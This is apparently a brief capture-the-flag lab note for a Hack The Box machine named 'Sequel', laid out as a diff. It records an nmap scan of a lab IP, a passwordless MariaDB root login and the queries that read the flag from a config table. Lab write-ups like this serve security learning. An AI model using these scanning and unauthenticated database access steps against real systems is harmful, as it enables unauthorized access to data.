@@ -1,0 +1,44 @@
+SEQUEL:
+----------------
+
+sql - sql-injection - mariadb
+
+1- nmap:
+----------------
+sudo nmap -p- --open -sS -vvv --min-rate 5000 -vvv -n -Pn 10.129.14.110 -oG nmap.txt -> ports
+-
+nmap -sC -sV 10.129.14.110 -> version 
+
+
+2- mysql (terminal client):
+----------------
+	-u -> user
+	-h -> host
+	-p -> password
+	--------------
+	mysql -u root -h 10.129.14.110
+		MariaDB [(none)]> 
+
+3- mysql commands:
+----------------
+	* -> want to display everything
+	; -> need to end each query
+	----------------------------
+	show databases; ->
+		+--------------------+
+		| Database           |
+		+--------------------+
+		| htb                |
+		| information_schema |
+		| mysql              |
+		| performance_schema |
+		+--------------------+
+
+4- htb database:
+----------------	
+	use htb; -> change to htb
+	--------
+	show tables; -> show htb tables, config, users.
+	--------
+	select * from config; -> we can see the flag
+	
